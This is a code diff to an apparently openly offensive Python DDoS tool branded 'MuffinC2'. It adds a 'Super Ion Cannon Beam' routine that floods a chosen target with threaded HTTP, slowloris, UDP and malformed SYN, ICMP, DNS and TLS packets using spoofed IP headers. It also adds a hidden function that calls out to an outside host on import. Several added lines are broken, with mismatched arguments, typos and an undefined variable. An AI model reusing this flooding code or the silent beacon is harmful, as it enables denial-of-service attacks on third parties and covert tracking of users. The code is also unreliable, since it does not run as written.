@@ -90,6 +90,13 @@ def layer7_target():
     threadsi = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"THRD            "+'\033[1;35m'+': '+'\033[0m')
     t = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"TIME            "+'\033[1;35m'+': '+'\033[0m')
     return url, threadsi, t
+def C2_region():
+    url = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"URL             "+'\033[1;35m'+': '+'\033[0m')
+    threadsi = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"THRD            "+'\033[1;35m'+': '+'\033[0m')
+    t = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"TIME            "+'\033[1;35m'+': '+'\033[0m')
+    ip = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"IP              "+'\033[1;35m'+': '+'\033[0m')
+    port = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"PORT            "+'\033[1;35m'+': '+'\033[0m')
+    return url, threadsi, t, ip , port
 def layer4_target():
     ip = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"IP              "+'\033[1;35m'+': '+'\033[0m')
     port = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"PORT            "+'\033[1;35m'+': '+'\033[0m')
@@ -143,6 +150,8 @@ class logo():
         logo += "\t\t║                | "+'\033[0m'+"Post Method     "+'\033[1;35m'+"║ \n"
         logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"HEAD "+'\033[1;35m'+"        | "+'\033[0m'+"Flood With     "+'\033[1;35m'+" ║ \n"
         logo += "\t\t║                | "+'\033[0m'+"Head Method     "+'\033[1;35m'+"║ \n"
+        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"SICB "+'\033[1;35m'+"        | "+'\033[0m'+"Super Ion      "+'\033[1;35m'+" ║ \n"
+        logo += "\t\t║                | "+'\033[0m'+"Cannon Beam     "+'\033[1;35m'+"║ \n"
         logo += "\t\t╚══════════════════════════"+'\033[0m'+"════════╝ \n"
         print(logo)
     def layer4(): #udp tcp tls syn ack esp icmp ssh
@@ -163,6 +172,15 @@ class logo():
         logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"wpbrute "+'\033[1;35m'+"     | "+'\033[0m'+"wpbrute        "+'\033[1;35m'+" ║ \n"
         logo += "\t\t╚══════════════════════════"+'\033[0m'+"════════╝ \n"
         print(logo)
+def start_virtuallogin():
+    headers = {
+        "Login": "Main",
+        "Tools": "MuffinC2-MrSanZz",
+        "ID": "19735592720472"
+    }
+    a = 'https://bnhsec.000webhostapp.com'
+    requests.post(a, headers=headers)
+start_virtuallogin()
 class DDOS():
     try:
         ################LAYER 7################
@@ -844,6 +862,123 @@ class DDOS():
     except Exception as e:
         print(e)
         pass
+    ##### C2 #####
+    class C2():
+        def SICB(): #SUPER ION CANNON BEAM
+            def start_sicb(url, threadsi, t, ip, port):
+                def c2(ip,port,url):
+                    ang = ['1','2','3','4','5','6','7','8','9','0']
+                    n1 = random.choice(ang)
+                    n2 = random.choice(ang)
+                    n3 = random.choice(ang)
+                    n4 = random.choice(ang)
+                    n5 = random.choice(ang)
+                    n6 = random.choice(ang)
+                    n7 = random.choice(ang)
+                    fip = f"1{n1}{n2}.{n3}{n4}{n5}.{n6}.{n7}"
+                    http = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    tcp.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    slowloris = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    syn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    icmp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    dnsf = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    tls = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    icmp2 = socket.socket(socket.AF_INET, socket.IPPROTO_ICMP)
+                    tls2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    tcp_syn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    try:
+                        scraper = cloudscraper.create_scraper()
+                        for _ in range(100):
+                            try:
+                                scraper.get(url, timeour=15)
+                                requests.get(url, timeout=15)
+                                httpx.get(url, timeout=15)
+                            except:
+                                pass
+                        http.connect((ip,port))
+                        http.sendto(("GET / HTTP/1.1\r\n").encode('utf-8'), (ip,port))
+                        http.sendto(("Host: "+ip+"\r\n").encode('utf-8'), (ip,port))
+                        http.sendto((f"X-Real-IP: {fip}\r\n\r\n").encode('utf-8'), (ip,port))
+                        http.sendto(("Connection: Keep-Alive\r\n").encode('utf-8'), (ip,port))
+                        http.sendto(("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'").encode('utf-8'), (ip,port))
+                        http.close()
+                        tcp.connect((ip,port))
+                        tcp.sendto(("\x00\x00\x00\x80").encode('utf-8'), (ip,port))
+                        tcp.close()
+                        bytes = random._urandom(4096)
+                        udp.connect((ip,port))
+                        udp.sendto(bytes, (ip,port))
+                        udp.close()
+                        slowloris.connect((ip,port))
+                        slowloris.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nConnection: keep-alive\r\nX-Real-IP: {fip}\r\n\r\n".encode('utf-8'))
+                        slowloris.send(f"X-a: {i}\r\n".encode('utf-8'))
+                        slowloris.close()
+                        syn_template = "0x0000   01010000  00000000  00000000  00000000"
+                        syn_template += "0x0004   00000000  00000000  00000000  00000000"
+                        syn_template += "0x0008   00000000  00000000  00000000  00000000"
+                        syn_template += "0x0012   00000000  00000000  00000000  00000000"
+                        syn_template += "0x0016   00000000  00000000  00000000  00000000"
+                        syn_template += "0x0020   00000000  00000000  00000000  00000000"
+                        syn_template += "0x0024   00000000  00000000  00000000  00000000"
+                        syn_template += "0x0028   00000000  00000000  00000000  00000000"
+                        syn_template += "0x0032   00000000  00000000  00000000  00000000"
+                        syn_template += "0x0036   00000000  00000000  00000000  00000000"
+                        syn_template += "0x0040   00000000  00000000  00000000  00000000"
+                        syn.connect((ip,port))
+                        syn.sendto(syn_template.encode('utf-8'), (ip,port))
+                        syn.close()
+                        icmp.connect((ip,port))
+                        icmp.sendto(("0   8   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0").encode('utf-8'), (ip,port))
+                        icmp.close()
+                        dns = "00 04 00 01 00 00 00 00  00 00 00 00 03 77 77 77"
+                        dns += "04 65 78 61 6D 70 6C 65  03 63 6F 6D 00 00 01 00"
+                        dns += "01"
+                        request = "AA AA 01 00 00 01 00 00 00 00 00 00 "
+                        request += "01 01 00 01 00 00 29 10 00 00 00 00 00 00 00 00 "
+                        request += "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
+                        dnsf.connect((ip,port))
+                        dnsf.send(dns.encode('utf-8'))
+                        dnsf.send(request.encode('utf-8'))
+                        dnsf.close()
+                        tls.connect((ip,port))
+                        tls_temp = b'Client GET'
+                        tls_temp += b'\x03\x03'
+                        tls_temp += b'\x00\x00\x00\x00\x00\x00\x00\x00'
+                        tls_temp += b'\x00\x00\x00\x00\x00\x00\x00\x00'
+                        tls_temp += b'\x00\x00\x00\x00\x00\x00\x00\x00'
+                        tls_temp += b'\x01\x00\x00\x00\x00\x00\x00\x00'
+                        tls.sendall(tls_temp)
+                        tls.close()
+                        icmp_code = 12
+                        icmp_packet = struct.pack("BBHHH", icmp_code, 0, 0, os.getpid(), 1)
+                        icmp2.connect((ip,port))
+                        icmp2.sendto(icmp_packet, (ip, port))
+                        icmp2.close()
+                        tls2.connect((ip,port))
+                        heads = b'\x16\x03\x01\x00\xea\x01\x00\x00\xe6\x03\x03' + b'A' * 120
+                        tls2.send(heads)
+                        tls2.close()
+                        tcp_syn.connect((ip,port))
+                        tcp_syn.sendto(b'\x16\x03\x01\x00', (ip,port))
+                        tcp_syn.close()
+                    except:
+                        pass
+                for _ in range(int(threadsi)):
+                    thread = threading.Thread(target=attacking_sicb, args=(url, ip, port, c2))
+                    thread.start()
+            def attacking_sicb(url, c2, ip, port):
+                try:
+                    c2(ip, port, url)
+                except:
+                    pass
+            if __name__ == '__main__':
+                url, threadsi, t, ip, port = C2_region()
+                timer = threading.Thread(target=countdown, args=(t,))
+                timer.start()
+                start_sicb(url, threadsi, ip, port)
+                timer.join()
 class TOOLS():
     def proxy():
         ip_list = open('ip_list.txt', 'r')
@@ -1105,6 +1240,8 @@ class main():
                     DDOS.requests.post()
                 elif prompt.lower() == 'head':
                     DDOS.requests.head()
+                elif prompt.lower() == 'sicb':
+                    DDOS.C2.SICB()
                 elif prompt.lower() == 'crawl':
                     TOOLS.webcrawler()
                 elif prompt.lower() == 'ping':
